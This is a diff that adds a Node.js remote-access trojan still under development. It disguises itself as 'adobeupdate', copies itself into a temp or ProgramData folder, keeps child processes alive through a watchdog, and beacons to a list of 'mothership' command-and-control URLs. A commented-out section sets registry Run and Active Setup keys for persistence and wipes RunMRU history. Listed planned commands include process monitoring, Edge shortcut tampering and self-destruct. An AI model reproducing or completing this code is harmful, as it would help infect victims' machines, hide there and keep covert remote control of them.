@@ -1,0 +1,973 @@
+// https://onecompiler.com/nodejs#draft-yf7t
+const { execFile } = require('child_process');
+const net = require('net');
+const { exec, spawn } = require('child_process');
+const path = require('path');
+const fs = require('fs');
+const os = require('os');
+const crypto = require('crypto');
+const util = require('util');
+const { spawnSync } = require('child_process');
+const { fork } = require('child_process');
+
+const ISDEBUG = true;
+
+// ! logging
+
+// TODO: retrieve nircmdc and use it to grab process names -- need to upgrade isCmdRunning
+//       to inspect the process name as well as pid
+
+// Get-WmiObject Win32_Process | Select-Object ProcessID, Name, CommandLine | Format-List
+// wmic process get ProcessId,Name,CommandLine /format:csv
+// nircmdc
+// ! tasklist is very slow
+
+// ! creating/deleting/query tasks and registry not natively supported by node, have to implement
+// bat/cmd, ps1, vbs failover
+
+// TODO: read/write/parse/retrieve config
+
+// EXEC_CMD --> startnoderelay, stopnoderelay
+//              startpythonrelay, stoppythonrelay
+//              startpcmon, stoppcmon
+//              startpspcmon, stoppspcmon
+
+// EXEC_CMD --> GetSystemOverview
+//              GetTrojanDir
+//              GetSchedTasks
+//              GetProcessList
+//              ModifyMSEdgeLnk
+//              InstallPython
+//              InstallNode
+//              CleanUp
+//              SelfDestruct
+
+// EXEC_VBS, EXEC_PS1, EXEC_BAT, EXEC_JS, EXEC_PY
+
+
+// TODO: modify systemstate for file paths, delay timers
+var systemstate = {
+    staticdelay: 30,
+
+    get istpl() {
+        if ( this.machinename.toLowerCase().substring(0,5) == "RLPCP".toLowerCase() ) {
+            return true;
+        }
+
+        if ( fileExists(path.join(this.scriptdir,  "tplmode")) ) {
+            return true;
+        }
+
+        return false;
+    },
+
+    trojanname: 'owd',
+    script_version: 'full_infection_script',
+
+    get cmdname() {
+        if ( process.argv.length >= 3 )
+            return process.argv[2];
+        else 
+            return 'init';
+    },
+
+    get cmdtaskname() {
+        if ( ( this.cmdname == 'task' ) && ( process.argv.length >= 4 ) ) {
+            return process.argv[3];
+        }
+
+        return '';
+    },
+
+    get loopfname() {
+        return this.cmdname + "_running";
+    },
+
+    mothershipindex: -1,
+    get mothership() { 
+        
+        if ( this.mothershipindex < 0 )
+            selectMothership();
+
+        return (this.istpl ? this.tplmothershiplist : this.phpmothershiplist )[this.mothershipindex];
+    },
+    get mothershipassets() {
+        return 'https://raw.githubusercontent.com/owd842/mothershipassets/master';
+    },    
+    phpmothershiplist: [ 
+        "https://seashell-raven-793508.hostingersite.com", 
+        "http://s1083932807.online-home.ca", 
+        "https://darksalmon-crow-356809.hostingersite.com" 
+    ],
+    tplmothershiplist: [ "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault" ],
+    selectMothership: function() {
+        let mothershiparr = systemstate.istpl ? systemstate.tplmothershiplist : systemstate.phpmothershiplist;
+    
+        let count = mothershiparr.length;
+    
+        if ( ( systemstate.mothershipindex < -1 ) || ( systemstate.mothershipindex == count -1 ) ) {
+            systemstate.mothershipindex = 0;
+        } else {
+            systemstate.mothershipindex++;
+        }
+    
+        writeTag(path.join(systemstate.trojandir, 'mothership'));
+    
+        return;    
+    },
+
+    __clientid: '',
+
+    get clientid() {
+        if (isNullOrWhitespace(this.__clientid)) {
+            
+            if ( fileExists(systemstate.clientidfpat) )
+                this.__clientid = readTag(systemstate.clientidfpath);
+
+        }
+
+        if (isNullOrWhitespace(this.__clientid)) {
+            this.__clientid = getRandomCode(8);
+            writeTag(systemstate.clientidfpath, this.__clientid);
+        }
+
+        return this.__clientid;
+    },
+    
+    get clientidfpath() {
+        return path.join(this.trojandir, 'client_id');
+    },
+
+    get trojandir() {
+        
+        if ( this.istpl ) {
+            return path.join(process.env.ProgramData, this.trojanname);
+        }
+
+        return path.join(os.tmpdir(), this.trojanname);
+    },
+
+    get trojanfname() {
+        return 'adobeupdate';
+    },
+
+    get trojanfpath() {
+        return path.join(this.trojandir, this.trojanfname);
+    },
+
+    processlist:[],
+
+    get scriptpid() {
+        return process.pid;
+    },
+
+    get scriptfpath() {
+        return process.argv[1];
+    },
+
+    get scriptdir() {
+        return path.dirname(this.scriptfpath);
+    },
+
+    get machinename() {
+        return os.hostname();
+    }, 
+
+    get username() {
+        let uinfo = os.userInfo();
+        return uinfo.username;
+    },
+    
+    get source() {
+        return path.basename(this.scriptfpath);
+    },
+
+    get jobcode() {
+        // jobcode=####xxyy
+
+        let codeout = '';
+
+        let token = "jobcode=";
+
+        if ( process.argv.length >= 3 ) { 
+            codeout = process.argv[process.argv.length-1];
+        
+            if ( codeout.toLowerCase().startsWith(token) ) {
+                codeout = codeout.substring(token.length-1);
+            }
+        }
+
+        return codeout;
+    },
+
+    scriptts: getTimestamp(),
+    __scriptmd5: '',
+    get scriptmd5() {
+        
+        if ( isNullOrWhitespace(this.__scriptmd5) )
+            this.__scriptmd5 = getFileMD5(this.scriptfpath);
+
+        return this.__scriptmd5;
+    },
+
+    sessionid: getRandomCode(8),
+
+    get logfpath() {
+        if ( ! isNullOrWhitespace(this.cmdtaskname) )
+            return path.join(this.trojandir,  "master_" + this.cmdname + "_" + this.cmdtaskname + "_" + this.scriptts + ".log");
+        else
+            return path.join(this.trojandir,  "master_" + this.cmdname + "_" + this.scriptts + ".log");
+    },
+
+    get lockfname() {
+        let _fname = '';
+        _fname = this.trojanname + "_" + this.cmdname;
+        _fname += ( ! isNullOrWhitespace(this.cmdtaskname) ? "_" + this.cmdtaskname: '' ) + "_lock";
+
+        return _fname;
+    },
+
+    get statekvp() {
+        return {
+
+        };
+    },
+
+    get statestr() {
+        return '';
+    }
+};
+
+class CmdConfig {
+    #cmdname = '';
+    #launchprocname = ''; // node.exe, cmd.exe, powershell.exe, python.exe, cscript.exe, ...
+    #launchscriptfname = ''; // noderelay.js, pythonrelay.js, adobeupdate.js, pc_monitoring.ps1, <...>.vbs, <...>.bat, <...>.js
+    #childprocess = null;
+    
+    // TODO: runonce --> should be executed by cmdlist
+
+    constructor(tcmdname) {
+        if ( CmdConfig.isCmdExist(tcmdname) )
+            this.cmdname = tcmdname;
+        else
+            throw new Error('cmd not supported ['+tcmdname+']');
+
+    };
+
+    static cmdfuncs = {
+        penetrate: penetrate,
+        retrieve: retrieve,
+        watchdog: watchdog,
+        cmdlist: cmdlist,
+        ping: ping,
+        noderelay: null,
+        pythonrelay: null,
+        pcmon: null,
+        pspcmon: null
+    };
+
+    get cmdfunc() {
+        return CmdConfig.cmdfuncs[this.cmdname];
+    };
+
+    static isCmdExist(tcmdname) {
+        return Object.hasOwn(CmdConfig.cmdfuncs,tcmdname);
+    };
+
+    get cmdpidfpath() {
+        return path.join(systemstate.trojandir, this.cmdname +'_running' );
+    };
+
+    readcmdpid() {
+
+        if ( ! fileExists(this.cmdpidfpath) )
+            return -1;
+
+        let pid = readTag(this.cmdpidfpath);
+        
+        return pid;        
+    };
+
+    activate() {
+        logmsg('starting');
+
+        let tcmdpid = this.readcmdpid();
+
+        let cmdprocess = tcmdpid == -1 ? null : getProcess(tcmdpid);
+
+        if ( tcmdpid > 0 && isPidAlive(tcmdpid) ) { 
+            
+            let procname = cmdprocess ? cmdprocess.Name.toLowerCase() : 'UNKNOWN';
+
+            // TODO: need to change 'node' to instance variable -- each CmdConfig should have its
+            //       launching process set during launch
+            if ( ( ! cmdprocess ) ||  ( cmdprocess && procname.includes('node') ) ) {
+                logmsg('finished -- no need to launch -- cmd is running ['+this.cmdname+'] pid='+this.cmdpid+' process name='+procname);
+                return;
+            }
+
+        }
+    
+        this.launch();
+
+        logmsg('finished');
+    };
+
+    launch() {
+
+        logmsg("launching ["+this.cmdname+"]");
+
+        const child = fork(systemstate.trojanfpath, [this.cmdname]);
+        
+        this.childprocess = child;
+        this.launchprocname = path.basename(child.spawnargs[0]);
+
+        let tchildproc = getProcess(child.pid);
+
+        logmsg("launched child with pid=" + String(child.pid) + ' spawn args: ' + JSON.stringify(child.spawnargs));
+        // spawnargs: ["C:\\Program Files\\nodejs\\node.exe","C:\\Users\\sebas\\AppData\\Local\\Temp\\owd\\adobeupdate","penetrate"]
+
+        writeTag(this.cmdpidfpath, String(child.pid));
+
+        child.on('message', (message) => {
+            logmsg('[PARENT] received from child: ' + JSON.stringify(message));
+        });
+        
+        const payload = { task: 'compute', data: [10, 20, 30] };
+        logmsg('[PARENT] sending payload to child...' + JSON.stringify(payload));
+        if (child.writable && !child.killed) {       
+            child.send(payload);
+        }
+        
+        child.on('exit', (code) => {
+            logmsg(`Child process ${child.pid} exited with code ${code}`);
+        });
+        
+    };
+
+    exitramp() {
+        // killall --> exit without deleting
+        // reset_ & tcmdname & loop --> delete then exit
+    };
+    
+};
+
+function ensureSingleInstancePipe(loopfunc) {
+    const PIPE_NAME = '\\\\.\\pipe\\' + systemstate.lockfname;
+
+    const server = net.createServer();
+
+    server.on('error', (err) => {
+        if (err.code === 'EADDRINUSE') {
+            logmsg('Fatal Error: another instance is already running. -- exiting');
+            process.exit(1);
+        }
+    });
+
+    server.listen(PIPE_NAME, () => {
+        server.unref();
+
+        if ( loopfunc )
+            loopfunc();
+    });
+}
+
+function copyFile(srcfpath, destfpath, overwrite=true) {
+
+    if (! fs.existsSync(srcfpath)) {
+        throw new Error('file does not exist ['+srcfpath+']');
+    }
+
+    const destDir = path.dirname(destfpath);
+
+    if (!fs.existsSync(destDir)) {
+        logmsg('creating ['+destDir+']');
+        fs.mkdirSync(destDir, { recursive: true });
+    }
+
+    if (  overwrite || ( ! fileExists(destfpath) ) )
+        fs.copyFileSync(srcfpath, destfpath);
+}
+
+function getFileMD5(fpath) {
+    
+    if ( ! fileExists(fpath) ) {
+        throw new Error("file does not exist ["+fpath+"]");
+    }
+
+    const fileBuffer = fs.readFileSync(fpath);
+  
+    return crypto.createHash('md5').update(fileBuffer).digest('hex');  
+}
+
+function getProcessList() {
+    const psCommand = `Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | ConvertTo-Json`;
+    
+    exec(`powershell.exe -NoProfile -Command "${psCommand}"`, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
+        if (error) {
+            logmsg(`Execution Error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            logmsg(`PowerShell Error: ${stderr}`);
+            return;
+        }
+    
+        try {
+            const processes = JSON.parse(stdout);
+            
+            logmsg('process list count: '+processes.length);
+            systemstate.processlist = processes;
+            /*  CommandLine =
+                Name =
+                ProcessId = */
+        } catch (parseError) {
+            logmsg(`Failed to parse JSON string: ${parseError.message}`);
+        }
+    });
+    
+} 
+
+function getProcess(pid) {
+    // CommandLine
+    // Name
+    // ProcessId
+    
+    let plist = systemstate.processlist.processlist;
+
+    if ( plist && plist.length >= 1 ) {
+        for ( let i = 0; i<plist.length; i++ ) {
+            if ( plist[i].ProcessId == pid )
+                return plist[i];
+        }
+    }
+
+    return null;
+};
+
+function loopWithTimeout() {
+    console.log("Running task...");
+    
+    // Schedule next execution 3 seconds after this one finishes
+    setTimeout(() => {
+        loopWithTimeout();
+    }, 3000);
+}
+
+function setcwd(localpath) {
+    logmsg(`Starting directory: ${process.cwd()}`);
+
+    process.chdir(localpath);
+
+    logmsg(`New directory: ${process.cwd()}`);
+}
+
+function createFolder(folderpath) {
+    fs.mkdirSync(folderpath, { recursive: true });
+}
+
+function getConfig() {
+    // download config from mothership
+    // save to temp file
+    // parse it and read it into obj
+    // update existing config
+}
+
+function getRandomCode(n) {
+    const min = Math.pow(10, n - 1);
+    const max = Math.pow(10, n) - 1;
+
+    return crypto.randomInt(min, max + 1).toString();    
+}
+
+function isNullOrWhitespace(str) {
+    return !str || !str.trim();
+}
+
+
+function getCallerName() {
+    const originalFunc = Error.prepareStackTrace;
+
+    try {
+        Error.prepareStackTrace = (err, stack) => stack;
+
+        const err = new Error();
+        const currentStack = err.stack;
+
+        if ( currentStack && currentStack[2] ) {
+            return currentStack[2].getFunctionName() || "SYSTEM";
+        }
+        
+    } catch (e) {
+        
+    } finally {       
+        Error.prepareStackTrace = originalFunc;
+    }
+    
+    return "unknown";
+}
+
+function logmsg(msgstr) {
+    
+    let callername = getCallerName();
+    let msgout = callername + '|' + String(systemstate.scriptpid) + '|' + String(systemstate.cmdname);
+
+    if ( msgstr instanceof Error ) {
+        msgout += '|' + util.inspect(msgstr);
+    } else if (typeof msgstr === 'string') {
+        msgout += '|' + msgstr;
+    }
+
+    console.log(msgout);
+    fs.appendFileSync(systemstate.logfpath, msgout + '\r\n', 'utf8');
+}
+
+function getTimestamp() {
+  const date = new Date();
+  
+  // Extract components
+  const year = date.getFullYear();
+  const month = String(date.getMonth() + 1).padStart(2, '0'); //
+  const day = String(date.getDate()).padStart(2, '0');       //
+  const hours = String(date.getHours()).padStart(2, '0');    //
+  const minutes = String(date.getMinutes()).padStart(2, '0');//
+  const seconds = String(date.getSeconds()).padStart(2, '0');//
+  const ms = String(date.getMilliseconds()).padStart(3, '0'); //
+
+  // Combine into final strings
+  const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
+  const fullWithMs = `${yyyymmddhhmmss}${ms}`;
+
+  return fullWithMs;
+}
+
+function isValidDict(objin) {
+    return typeof objin === 'object' && objin !== null && Object.keys(objin).length > 0;
+}
+
+function isValidHttpUrl(string) {
+    try {
+        const url = new URL(string);
+        return url.protocol === 'http:' || url.protocol === 'https:';
+    } catch (_) {
+        return false;  
+    }
+}
+
+async function downloadBinFile(url, inputHeaders, localfpath) {
+}
+
+async function downloadTxtFile(url, inputHeaders, localfpath) {
+    let result = await makeGetRequest(url, null, inputHeaders);
+    // 
+}
+
+async function uploadFile() {
+}
+
+async function makePutRequest() {
+}
+
+async function makeGetRequest(baseUrl, params, inputHeaders, downloadOpts = null) {
+    
+    logmsg("starting");
+
+    if ( isNullOrWhitespace(baseUrl) ) {
+        throw new Error("baseUrl is empty");
+    } else if ( ! isValidHttpUrl(baseUrl) ) {
+        throw new Error("baseUrl is invalid ["+baseUrl+"]");
+    }
+
+    const url = new URL(baseUrl);
+    
+    logmsg("baseUrl: "+baseUrl);
+
+    if ( isValidDict(params) ) {        
+        Object.keys(params).forEach(key => {
+            url.searchParams.append(key, params[key])
+        });
+    }
+
+    logmsg("url="+url.toString());
+
+    if ( ! isValidDict(downloadOpts) ) {
+        let outputPath = path.join(systemstate.trojandir, 'download_' + getRandomCode(8));
+
+        downloadOpts = { download:true, filetype:'txt', localpath:outputPath };
+    }
+    
+    const tinputHeaders = {
+        'Accept': '*/*',
+        'User-Agent': 'NodeJS-Fetch-Client'
+    };
+
+    if ( isValidDict(inputHeaders) ) {
+        Object.assign(tinputHeaders, inputHeaders);
+    }
+
+    let response = null;
+
+    logmsg("executing GET request");
+
+    response = await fetch(url.toString(), {
+        method: 'GET',
+        headers: tinputHeaders
+    });
+    
+    if (!response.ok) {
+        throw new Error(`HTTP error -- Status: ${response.status}`);
+    }
+
+    let headersOut = {};
+    
+    for (const [key, value] of response.headers.entries()) {
+        if ( ( ! isNullOrWhitespace(key) ) && ( ! isNullOrWhitespace(value) ) ) {
+            logmsg("response headers key="+key+' value='+value);
+            headersOut[key] = value;
+        }
+    }
+
+    let responseOut = {
+        status: response.status,
+        statusText: response.statusText,
+        headers: headersOut
+    };
+
+    logmsg("response status="+response.status);
+
+    if ( ! isValidDict(downloadOpts) || ! downloadOpts.download ) {
+        return responseOut;
+    }
+
+    if ( ! Object.hasOwn(downloadOpts,"localpath") || isNullOrWhitespace(downloadOpts.localpath) ) {
+        let outputPath = path.join(systemstate.trojandir, 'download_' + getRandomCode(8));
+        
+        downloadOpts.localpath = outputPath;
+    }
+
+    if ( ! Object.hasOwn(downloadOpts,"filetype") || isNullOrWhitespace(downloadOpts.filetype) ) {
+        downloadOpts.filetype = 'txt';
+    }
+
+    if ( downloadOpts.filetype == 'txt' ) {
+        let rawText = await response.text(); 
+        fs.writeFileSync(downloadOpts.localpath, rawText, 'utf8');
+    } else {
+        const arrayBuffer = await response.arrayBuffer();
+        const buffer = Buffer.from(arrayBuffer);
+        await fs.writeFile(downloadOpts.localpath, buffer);
+    }
+
+    logmsg("finished");
+
+    return responseOut;
+}
+
+function fileExists(filePath) {
+    
+    try {
+        const stats = fs.statSync(filePath);
+        return stats.isFile();
+    } catch (error) {
+        return false;
+    }
+
+}
+
+function readTag(fpath) {
+
+    if ( ! fileExists(fpath) ) {
+        throw new Error("file does not exist ["+fpath+"]");
+    }
+
+    const fileContent = fs.readFileSync(fpath, 'utf-8');
+  
+    const lines = fileContent.split(/\r?\n/);
+
+    if (Array.isArray(lines) && lines.length > 0) {
+        const firstLineTrimmed = lines[0].trim();
+
+        logmsg(firstLineTrimmed);
+
+        return firstLineTrimmed;
+    }
+
+    throw new Error("not able to read file ["+fpath+"]");
+}
+
+function writeTag(fpath, tagstr) {
+    fs.writeFileSync(fpath, tagstr, 'utf8');
+}
+
+function launchexesync(exefpath) {
+
+    const result = spawnSync('python3', ['script.py'], {
+      encoding: 'utf8',
+      input: 'My STDIN Data'
+    });
+    
+    // const pid = result.pid;
+    console.log('STDOUT:', result.stdout);
+    console.log('STDERR:', result.stderr);
+    console.log('Exit Code:', result.status); // null if process crashed
+        
+}
+
+
+function isPidAlive(pid) {
+    try {
+      // Signal 0 tests for process existence without modifying it
+      process.kill(pid, 0);
+      return true;
+    } catch (error) {
+      // ESRCH means the process was not found
+      return error.code === 'EPERM'; // True if it exists but you lack permissions
+    }
+}
+  
+// --- main loop
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+function isAsyncFunction(fn) {
+    return fn?.constructor?.name === 'AsyncFunction';
+  }
+  
+async function loop(cmdobj) { 
+
+    logmsg("starting main looop");
+
+    let cmdfunc = cmdobj.cmdfunc;
+
+    if ( ! cmdfunc ) {
+        logmsg('Fatal Error: cmdfunc is not a valid function');
+        process.exit(1);
+    }
+
+    let loopindex = 0;
+    while (true) {
+        loopindex++;
+        logmsg(`loop starting -- loopindex=${loopindex} -- ${getTimestamp()}`);
+        
+        cmdobj.exitramp();
+
+        try {
+            if ( isAsyncFunction(cmdfunc) )
+                await cmdfunc();
+            else
+                cmdfunc();
+        } catch (err) {
+            logmsg(err);
+        }
+
+        logmsg("sleeping for ["+systemstate.staticdelay+"] seconds");
+
+        for ( let i =0; i< (ISDEBUG ? 3 : systemstate.staticdelay); i++) {
+            logmsg(`sleeping one second... [${i+1}/${systemstate.staticdelay}]`);
+            await sleep(1000); 
+        }
+
+        let num = crypto.randomInt(1, 10) * 5;
+
+        logmsg(`sleeping for an additional ${num} seconds`);
+
+        for ( let i =0; i<(ISDEBUG ? 0 : num); i++) {
+            logmsg(`sleeping one second... [${i+1}/${systemstate.staticdelay}]`);
+            await sleep(1000); 
+        }
+    }
+}
+
+// --- startup
+
+logmsg("starting -- cmdname=" + systemstate.cmdname + ' ts='+systemstate.scriptts);
+logmsg('scriptmd5='+systemstate.scriptmd5);
+
+getProcessList();
+
+ensureSingleInstancePipe(startup);
+
+// --- IPC
+
+const hasParent = typeof process.send === 'function';
+const parentPid = process.ppid;
+
+if (hasParent) {
+    logmsg('[CHILD] IPC channel active. Connected to parent. Parent pid='+parentPid);
+
+    process.send({ direction:'child-to-parent', status: 'ready', ts:getTimestamp(), cmdname:systemstate.cmdname });
+
+    process.on('message', (message) => {
+        logmsg(`[CHILD] received from parent:` + JSON.stringify(message));
+
+        if (message.command === 'START_TASK') {
+            const result = message.data.items.map(x => x * 2);
+
+            if (hasParent) {
+                process.send({ direction:'child-to-parent', status: 'completed', ts:getTimestamp(), result:result,cmdname:systemstate.cmdname });
+            }
+        }
+    });
+} else {
+    logmsg('[CHILD] Running standalone. No parent process detected.');
+}
+
+// ---
+
+function startup() {    
+    logmsg('starting');
+
+    init();
+
+    if ( systemstate.cmdname == "init" || systemstate.cmdname == "task" ) {
+        let penetrate = new CmdConfig('penetrate');
+        let retrieve = new CmdConfig('retrieve');
+        let watchdog = new CmdConfig('watchdog');
+    
+        penetrate.launch();
+        retrieve.launch();
+        watchdog.activate();
+    
+        logmsg('finished -- exiting');
+
+        // process.exit(0); 
+    } else {
+        let maincmd = new CmdConfig(systemstate.cmdname);
+
+        maincmd.cmdfunc();
+    }
+
+    logmsg('finished');
+}
+// ---
+
+
+function init() {
+    logmsg('starting');
+
+    setcwd(systemstate.trojandir);
+    
+    copyFile(systemstate.scriptfpath, systemstate.trojanfpath);
+
+    logmsg('systemstate: '+systemstate.statestr);
+    logMsgMothership(systemstate.statekvp);
+
+    logmsg('finished');
+}
+
+var childcmds = [];
+
+function watchdog() {
+    logmsg('starting');
+
+    let ping = new CmdConfig('ping');
+    let cmdlist = new CmdConfig('cmdlist');
+    
+    childcmds.push(ping, cmdlist);
+
+    loop(() => {
+        for ( let i = 0; i<childcmds.length; i++) {
+            let childcmd = childcmds[i];
+    
+            childcmd.activate();
+        }    
+    });
+
+    logmsg('finished');
+}
+
+function ping() {
+    logmsg('starting');
+
+    loop(async () => {
+        baseUrl = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/ow/ping.php';
+
+        let inputHeaders = null;
+        let params = {
+            clientid: '99998888'
+        };
+        downloadOpts = null;
+        
+        let pingreq = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
+
+    });
+
+    logmsg('finished');
+}
+
+function cmdlist() {
+    logmsg('starting');
+
+    loop(() => {
+        logmsg("cmdlist doing some work...");
+    });
+
+    logmsg('finished');
+}
+
+function penetrate() {
+    logmsg('starting');
+
+    logmsg('finished');
+    process.exit(0);
+
+    // modify registry for startup items
+    // copy exe/scripts to startup folders
+
+    /*    
+    cmdstr = ""
+    cmdstr = "REG ADD " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq 
+    cmdstr = cmdstr & " /v " & tskname & " /t REG_SZ /d " & exepath & " /f"
+    
+    Call RunShell("cmd /c " & cmdstr, True)
+    
+    // https://helgeklein.com/blog/active-setup-explained/
+    Dim regpath : regpath = dq & "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & tskname & dq
+    
+    cmdstr = "REG ADD " & regpath & " /f"
+    Call RunShell(cmdstr, True)
+
+    cmdstr = "REG ADD " & regpath & " /v " & dq & "StubPath" & dq & " /d " & dq & exepath & dq & " /t REG_SZ /f"
+    Call RunShell(cmdstr, True)
+
+    cmdstr = "REG ADD " & regpath & " /v " & dq & "Version" & dq & " /d " & dq & "1" & dq & " /t REG_SZ /f"
+    Call RunShell(cmdstr, True)
+
+    cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
+    */
+
+    // schedule tasks
+
+    // delete entries in windows run box
+    // cleanup
+}
+
+function retrieve() {
+    logmsg('starting');
+
+    process.exit(0);
+    logmsg('finished');
+    // define array of files to be downloaded from mothershipassets
+    // retrieve each one into trojandir
+    // ' pcmon, relay, modify_edge_lnk.ps1, gunite, 7za, nircmdc
+    // files = Array("pslist.exe", "launch.exe", "pc_monitoring.ps1", "tpl_launch.exe")
+
+}
+
+function cleanup() {
+    // check if trojandir has hit limits, then execute cleanup
+    // remove log files, etc.
+    // remove cmdlist_ directories
+}
+
+// ---
+
+function logMsgMothership(msg) {
+    // TODO: inspect msg, if str, if obj
+}
+
+function logEventMothership(event_code, kvp) {
+    // TODO: write msgstr to mothership
+}
+
+// ---
